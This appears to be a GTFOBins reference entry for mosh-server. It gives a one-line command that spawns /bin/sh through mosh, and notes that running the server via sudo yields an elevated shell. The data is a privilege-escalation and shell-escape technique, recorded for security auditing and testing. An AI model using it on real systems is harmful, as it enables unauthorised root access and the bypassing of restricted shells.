<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/mosh-server -->
---
functions:
  shell:
  - code: |-
      mosh --server=mosh-server localhost /bin/sh
    comment: |-
      This requires a valid SSH access.
    contexts:
      sudo:
        comment: |-
          The `mosh-server` has to be executed via `sudo`, e.g., `'--server=sudo mosh-server'`.
...
